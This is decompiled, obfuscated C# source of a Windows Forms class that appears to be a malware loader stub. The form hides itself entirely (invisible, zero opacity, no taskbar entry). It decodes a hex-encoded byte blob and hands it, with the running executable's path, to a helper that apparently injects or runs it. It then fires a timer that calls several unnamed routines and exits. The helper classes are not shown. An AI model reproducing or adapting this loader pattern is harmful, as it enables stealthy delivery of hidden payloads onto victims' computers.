using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using ns0;

namespace ns3;

internal sealed class Form : Form
{
	private Timer timer_0;

	public IContainer icontainer_0;

	private TextBox textBox_0;

	private Button button_0;

	private Label label_0;

	private Label label_1;

	private Label label_2;

	private Label label_3;

	private Panel panel_0;

	private ProgressBar progressBar_0;

	void Form.Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	public void InitializeComponent()
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Expected O, but got Unknown
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Expected O, but got Unknown
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Expected O, but got Unknown
		//IL_022e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0238: Expected O, but got Unknown
		((Control)this).set_Visible(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Opacity(0.0);
		vmethod_1(new TextBox());
		vmethod_3(new Button());
		vmethod_5(new Label());
		vmethod_7(new Label());
		vmethod_9(new Label());
		vmethod_11(new Label());
		vmethod_13(new Panel());
		vmethod_15(new ProgressBar());
		((Control)this).SuspendLayout();
		TextBox obj = vmethod_0();
		Point location = new Point(12, 23);
		((Control)obj).set_Location(location);
		((Control)vmethod_0()).set_Name("TextBox1");
		vmethod_0().set_Text("");
		TextBox obj2 = vmethod_0();
		Size size = new Size(100, 20);
		((Control)obj2).set_Size(size);
		((Control)vmethod_0()).set_TabIndex(0);
		Button obj3 = vmethod_2();
		location = new Point(12, 49);
		((Control)obj3).set_Location(location);
		((Control)vmethod_2()).set_Name("Button1");
		Button obj4 = vmethod_2();
		size = new Size(75, 23);
		((Control)obj4).set_Size(size);
		((Control)vmethod_2()).set_TabIndex(1);
		((ButtonBase)vmethod_2()).set_Text("Button1");
		((ButtonBase)vmethod_2()).set_UseVisualStyleBackColor(true);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(284, 262);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)vmethod_14());
		((Control)this).get_Controls().Add((Control)(object)vmethod_12());
		((Control)this).get_Controls().Add((Control)(object)vmethod_10());
		((Control)this).get_Controls().Add((Control)(object)vmethod_8());
		((Control)this).get_Controls().Add((Control)(object)vmethod_6());
		((Control)this).get_Controls().Add((Control)(object)vmethod_4());
		((Control)this).get_Controls().Add((Control)(object)vmethod_2());
		((Control)this).get_Controls().Add((Control)(object)vmethod_0());
		((Control)this).set_Name("Form");
		((Form)this).set_Text("Form");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
		((Form)this).set_Opacity(0.0);
		timer_0 = new Timer();
		((Form)this).set_ShowInTaskbar(false);
		timer_0.set_Interval(2000);
		timer_0.add_Tick((EventHandler)timer_0_Tick);
	}

	public Form()
	{
		InitializeComponent();
		method_0();
	}

	private void method_0()
	{
		string string_ = Conversions.ToString(Class5.smethod_0());
		byte[] byte_ = method_1(string_);
		Class8.smethod_0(byte_, Process.GetCurrentProcess().MainModule!.FileName);
		timer_0.Start();
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void timer_0_Tick(object sender, EventArgs e)
	{
		try
		{
			Class6.smethod_0();
			Class7.smethod_0();
			Class7.smethod_1();
			Class7.smethod_2();
			Class7.smethod_3();
			Class7.smethod_4();
			Class7.smethod_5();
			Class7.smethod_6();
			Class7.smethod_7();
			ProjectData.EndApp();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private byte[] method_1(string string_0)
	{
		string text = string_0;
		int length = text.Length;
		int num = length / 2;
		if (length % 2 == 0)
		{
			num = checked(num - 1);
		}
		else
		{
			text = "0" + text;
		}
		checked
		{
			byte[] array = new byte[num + 1];
			long num2 = num;
			for (long num3 = 0L; num3 <= num2; num3++)
			{
				array[(int)num3] = Convert.ToByte(text.Substring((int)(num3 * 2L), 2), 16);
			}
			return array;
		}
	}

	[SpecialName]
	internal virtual TextBox vmethod_0()
	{
		return textBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_1(TextBox textBox_1)
	{
		textBox_0 = textBox_1;
	}

	[SpecialName]
	internal virtual Button vmethod_2()
	{
		return button_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_3(Button button_1)
	{
		button_0 = button_1;
	}

	[SpecialName]
	internal virtual Label vmethod_4()
	{
		return label_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_5(Label label_4)
	{
		label_0 = label_4;
	}

	[SpecialName]
	internal virtual Label vmethod_6()
	{
		return label_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_7(Label label_4)
	{
		label_1 = label_4;
	}

	[SpecialName]
	internal virtual Label vmethod_8()
	{
		return label_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_9(Label label_4)
	{
		label_2 = label_4;
	}

	[SpecialName]
	internal virtual Label vmethod_10()
	{
		return label_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_11(Label label_4)
	{
		label_3 = label_4;
	}

	[SpecialName]
	internal virtual Panel vmethod_12()
	{
		return panel_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_13(Panel panel_1)
	{
		panel_0 = panel_1;
	}

	[SpecialName]
	internal virtual ProgressBar vmethod_14()
	{
		return progressBar_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_15(ProgressBar progressBar_1)
	{
		progressBar_0 = progressBar_1;
	}
}
